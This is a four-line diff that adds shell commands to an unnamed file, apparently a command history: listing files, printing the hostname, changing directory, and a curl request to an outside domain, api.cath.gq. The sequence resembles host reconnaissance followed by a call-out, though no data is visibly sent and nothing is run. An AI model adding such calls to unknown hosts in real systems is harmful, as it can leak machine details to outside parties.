@@ -1,0 +1,4 @@
+ls
+hostname
+cd
+curl https://api.cath.gq/
